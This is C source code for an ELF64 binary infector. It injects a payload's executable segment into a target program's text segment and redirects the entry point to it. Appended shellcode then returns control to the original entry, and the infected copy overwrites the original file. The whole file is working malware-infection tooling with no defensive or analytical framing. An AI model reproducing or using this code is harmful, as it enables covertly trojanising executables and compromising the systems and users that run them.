#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <limits.h>
#include <elf.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <error.h>
#include <errno.h>

#define TMP ".xyz.tempo.elf64"

#define PRINT(fd, status, fmt, args...) fprintf(fd, "[%s]: %s:%d:%s(): " fmt, \
		status, __FILE__, __LINE__, __func__, ##args)
#define PRINT_ERROR(fmt, args...) PRINT(stderr, "\033[0;31mERROR\033[0m", fmt, ##args)
#define PRINT_INFO(fmt, args...) PRINT(stdout, "\033[0;34mINFO \033[0m", fmt, ##args)
#ifdef DEBUG
	#define PRINT_DEBUG(fmt, args...) PRINT(stdout, "\033[0;33mDEBUG\033[0m", fmt, ##args)
#else
	#define PRINT_DEBUG(fmt, args...)
#endif


/* Shellcode to transfer control flow back to target */
#define JMP_PATCH_OFFSET 1 // how many bytes into shellcode do we patch
/* movl $addr, $eax; jmp *eax; */
char parasite_shellcode[] =
	"\xb8\x00\x00\x00\x00\xff\xe0";

#ifdef DEBUG 
void debug_shellcode(const char *msg, const uint8_t* shellcode, int shellcode_size);
#endif



typedef struct elf_data {
	char *path;
	int fd;
	struct stat file_stat;
	uint8_t *mem;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
} elf_data_t;

void cleanup_elf_data(elf_data_t *data);
int check_elf_criteria(const elf_data_t *data);
elf_data_t* read_elf_data(const char *binary_path);
Elf64_Phdr* get_text_segment(elf_data_t* elf_data);

int infect_text_segment(elf_data_t *target, elf_data_t *payload);

int main(int argc, char** argv) {
	elf_data_t* target, *payload;
	if (argc != 3 ) {
		printf("Usage: %s <target> <payload>\n", argv[0]);
		goto error;
	}
	if((target = read_elf_data(argv[1])) == NULL) {
		goto error;
	}
	if((payload = read_elf_data(argv[2])) == NULL) {
		goto error;
	}
	PRINT_INFO("Successfully read binary data of target \"%s\" and payload \"%s\"\n", target->path, payload->path);
	if (infect_text_segment(target, payload) != 0) {
		PRINT_ERROR("Could not infect \"%s\" with payload \"%s\"\n", target->path, payload->path);
		goto error;
	}
	PRINT_INFO("Successfully infect \"%s\" with payload \"%s\"\n", target->path, payload->path);
	cleanup_elf_data(target);
	cleanup_elf_data(payload);
	PRINT_DEBUG("OK\n");
	exit(EXIT_SUCCESS);
error:
	cleanup_elf_data(target);
	cleanup_elf_data(payload);
	exit(EXIT_FAILURE);
}

#ifdef DEBUG 
void debug_shellcode(const char* msg, const uint8_t* shellcode, int shellcode_size) {
	int shellcode_idx, shellcode_off = 0;
	char shellcode_str[shellcode_size * 3];

	for(shellcode_idx = 0; shellcode_idx < shellcode_size; shellcode_idx++) {
		shellcode_off += sprintf(shellcode_str + shellcode_off, "%x ", shellcode[shellcode_idx]);
	}
	shellcode_str[shellcode_size * 3 - 1] = '\0';
	PRINT_DEBUG("%s: %s\n", msg, shellcode_str);
}
#endif

void cleanup_elf_data(elf_data_t* elf_data) {
#ifdef DEBUG
	char elf_path[512];
	strncpy(elf_path, elf_data->path, 512);
#endif
	if (!elf_data) {
		return;
	}
	if (elf_data->mem) {
		if(munmap(elf_data->mem, elf_data->file_stat.st_size) != 0) {
			PRINT_ERROR("Could not unmap file %s process mapped memory\n", elf_data->path);
		}
	}
	if (elf_data->fd) {
		close(elf_data->fd);
	}
	if (elf_data->path) {
		free(elf_data->path);
	}
	free((void*)elf_data);
	PRINT_DEBUG("Successfully cleanup %s file structures\n", elf_path);
}

elf_data_t* read_elf_data(const char* binary_path) {
	errno = 0;
	elf_data_t* elf_data = malloc(sizeof(elf_data_t));	
	if((elf_data->path = strdup(binary_path)) == NULL) {
		PRINT_ERROR("Failed to copy path for %s. Error: %s\n", binary_path, strerror(errno));
		goto error;
	}
	if((elf_data->fd = open(binary_path, O_RDONLY)) == -1) {
		PRINT_ERROR("Failed to open file %s. Error: %s\n", binary_path, strerror(errno));
		goto error;
	}
	if(fstat(elf_data->fd, &elf_data->file_stat) == -1) {
		PRINT_ERROR("Failed to get fstat of %s. Error: %s\n", binary_path, strerror(errno));
		goto error;
	}
	if((elf_data->mem = mmap(0, elf_data->file_stat.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, elf_data->fd, 0)) == MAP_FAILED) {
		PRINT_ERROR("Failed to map file %s to process memory. Error: %s\n", binary_path, strerror(errno));
		goto error;
	}
	
	// Check if file is elf
	if(memcmp("\x7f\x45\x4c\x46", elf_data->mem, 4) != 0) {
		PRINT_ERROR("File %s is not ELF binary\n", binary_path);
		goto error;
	}

	elf_data->ehdr = (Elf64_Ehdr*)elf_data->mem;
	elf_data->phdr = (Elf64_Phdr*)&elf_data->mem[elf_data->ehdr->e_phoff];
	elf_data->shdr = (Elf64_Shdr*)&elf_data->mem[elf_data->ehdr->e_shoff];

	PRINT_DEBUG("Successfully read %s\n", binary_path);
	return elf_data;
error:
	cleanup_elf_data(elf_data);
	return NULL;
}

Elf64_Phdr* get_text_segment(elf_data_t* elf_data) {
	Elf64_Phdr* current_phdr;
	int phdr_idx;
	for (phdr_idx = 0; phdr_idx < elf_data->ehdr->e_phnum; phdr_idx++) {
		current_phdr = &elf_data->phdr[phdr_idx];	
		if((current_phdr->p_flags & PF_X) && (current_phdr->p_flags & PF_R)) {
			PRINT_DEBUG("\n\tFound .text segment of target \"%s\":\n"
					"\t\tOffset: %p\n"
					"\t\tVirtual address: %p\n"
					"\t\tPhysical address: %p\n"
					"\t\tFile size: %d\n"
					"\t\tMemory size: %d\n",
					elf_data->path,
					current_phdr->p_offset,
					current_phdr->p_vaddr,
					current_phdr->p_paddr,
					current_phdr->p_filesz,
					current_phdr->p_memsz);
			return current_phdr;
		}
	}
	return NULL;
}

int infect_text_segment(elf_data_t *target, elf_data_t *payload) {
	long old_entry_addr;
	Elf64_Addr parasite_vaddr;
	Elf64_Off end_of_text;
	Elf64_Phdr *target_text_phdr, *payload_text_phdr;
	int phdr_i, phdr_j, shdr_i;
	uint64_t parasite_len, parasite_shellcode_jmp_off;

	old_entry_addr = target->ehdr->e_entry;

	PRINT_DEBUG("Old .text entry of target \"%s\" binary %p\n", target->path, old_entry_addr);
	PRINT_DEBUG("Using %d bytes as page size\n", getpagesize());

	target_text_phdr = get_text_segment(target);
	payload_text_phdr = get_text_segment(payload);

	PRINT_INFO("Infection payload size: payload file(\"%s\") %d bytes + return control flow shellcode %d bytes = %d\n",
			payload->path, payload_text_phdr->p_filesz, sizeof(parasite_shellcode),
			payload_text_phdr->p_filesz + sizeof(parasite_shellcode));

	for(phdr_i = 0; phdr_i < target->ehdr->e_phnum; phdr_i++) {
		if (&target->phdr[phdr_i] == target_text_phdr) {

			end_of_text = target_text_phdr->p_offset + target_text_phdr->p_filesz;
			PRINT_DEBUG("End of text of target \"%s\": %x\n", target->path, end_of_text);
			parasite_vaddr = target_text_phdr->p_vaddr + target_text_phdr->p_filesz;
			PRINT_DEBUG("Parasite \"%s\" infection virtual address in target \"%s\": %p\n", payload->path, target->path, parasite_vaddr);
			parasite_len = payload_text_phdr->p_filesz + sizeof(parasite_shellcode) - 1;
			target->ehdr->e_entry = parasite_vaddr;

			target_text_phdr->p_filesz += parasite_len;
			target_text_phdr->p_memsz += parasite_len;

			for(phdr_j = phdr_i + 1; phdr_j < target->ehdr->e_phnum; phdr_j++) {
				if(target->phdr[phdr_j].p_offset > target_text_phdr->p_offset + target_text_phdr->p_filesz) {
					PRINT_DEBUG("Offset of target \"%s\" segment %d was increased from %d to %d bytes\n", 
							target->path, phdr_j, target->phdr[phdr_j].p_offset, target->phdr[phdr_j].p_offset + getpagesize() );
					target->phdr[phdr_j].p_offset += getpagesize();
				}
			}
			break;
		}
	}

	for(shdr_i = 0; shdr_i < target->ehdr->e_shnum; shdr_i++) {
		if (target->shdr[shdr_i].sh_offset >= end_of_text) {
			PRINT_DEBUG("Ofset of target \"%s\" section %d was increased from %d to %d bytes\n", 
				target->path, shdr_i, target->shdr[shdr_i].sh_offset, target->shdr[shdr_i].sh_offset + getpagesize());
			target->shdr[shdr_i].sh_offset += getpagesize();
		} else if (target->shdr[shdr_i].sh_addr + target->shdr[shdr_i].sh_size == parasite_vaddr) {
			PRINT_INFO("Found section header where payload \"%s\" should locate: %p\n", payload->path, target->shdr[shdr_i].sh_addr);
			target->shdr[shdr_i].sh_size += parasite_len; 
		}
	}

	target->ehdr->e_shoff += getpagesize();

	PRINT_INFO("Changed entry point of target \"%s\" to %p\n", target->path, parasite_vaddr);	

	int temp_fd;

	temp_fd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IXUSR | S_IWUSR);
	if(temp_fd == -1) {
		PRINT_ERROR("Could not create temporary file \"%s\"\n", TMP);
		return -1;
	}
	PRINT_INFO("Create temporary file for infected target \"%s\": %s\n", target->path, TMP);

	if (write(temp_fd, target->mem, end_of_text) != end_of_text) {
		PRINT_ERROR("Error while write first part (end of text segment) of target \"%s\" to file \"%s\"\n", target->path, TMP);
		close(temp_fd);
		return -1;
	}
	PRINT_INFO("First part (up to end of text segment) of target \"%s\" wrote to file \"%s\"\n", target->path, TMP);

#ifdef DEBUG
	//debug_shellcode("Payload shellcode\n", &payload->mem[payload_text_phdr->p_offset], payload_text_phdr->p_filesz);
#endif

	if(write(temp_fd, &payload->mem[payload_text_phdr->p_offset], payload_text_phdr->p_filesz - 1) != payload_text_phdr->p_filesz - 1) {
		PRINT_ERROR("Error while write payload \"%s\" data into file %s\n", payload->path, TMP);
		close(temp_fd);
		return -1;
	}
	PRINT_INFO("Payload \"%s\" data wrote to file \"%s\"\n", payload->path, TMP);

#ifdef DEBUG
	debug_shellcode("Shellcode before patch", parasite_shellcode, sizeof(parasite_shellcode));
#endif
	*(uint32_t *)&parasite_shellcode[JMP_PATCH_OFFSET] = old_entry_addr;
#ifdef DEBUG
	debug_shellcode("Shellcode after patch with original entry addr", parasite_shellcode, sizeof(parasite_shellcode));
#endif

	PRINT_INFO("Create shellcode to restore original entry %p of target \"%s\"\n", old_entry_addr, target->path);
	if(write(temp_fd, parasite_shellcode, sizeof(parasite_shellcode)) != sizeof(parasite_shellcode)) {
		PRINT_ERROR("Could not insert shellcode for restore original target \"%s\" entrypoint %d to file \"%s\"\n",
				target->path, old_entry_addr, payload->path);
		close(temp_fd);
		return -1;
	}
	PRINT_INFO("Shellcode for restore original target \"%s\" entrypoint %d wrote to file \"%s\"\n",
			target->path, old_entry_addr, payload->path);

	lseek(temp_fd, getpagesize() - parasite_len, SEEK_CUR);
	
	Elf64_Off last_chunk_size = target->file_stat.st_size - end_of_text;
	if(write(temp_fd, target->mem + end_of_text, last_chunk_size) != last_chunk_size) {
		PRINT_ERROR("Could not insert last chunk (from end .text section up to end file) of target \"%s\" to file \"%s\"\n:", target->path, TMP);
		close(temp_fd);
		return -1;
	}

	PRINT_INFO("Last chunk (from end .text section up to end file) of target \"%s\" wrote to file \"%s\"\n", target->path, TMP);

	PRINT_INFO("Overwrite original target \"%s\" file with infected \"%s\"\n", target->path, TMP);
	rename(TMP, target->path);

	close(temp_fd);
	return 0;
}
